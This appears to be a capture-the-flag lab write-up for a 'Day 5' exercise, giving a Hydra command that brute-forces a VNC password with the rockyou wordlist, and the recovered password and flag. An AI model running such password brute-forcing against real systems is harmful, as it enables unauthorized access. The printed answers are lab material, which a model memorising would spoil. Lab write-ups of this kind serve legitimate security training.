# Day 5

### Use Hydra to find the VNC password of the target with IP address `MACHINE_IP`. What is the password?

```bash
hydra -P /usr/share/wordlists/rockyou.txt vnc://10.10.185.111 -V -f -t 4
```

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
1q2w3e4r
{% endhint %}

* Alternative method with nmap scripts

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

### Using a VNC client on the AttackBox, connect to the target of IP address `MACHINE_IP`. What is the flag written on the target’s screen? 

Connect to vnc with the credentials found in the step above

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
THM{I\_SEE\_YOUR\_SCREEN}
{% endhint %}
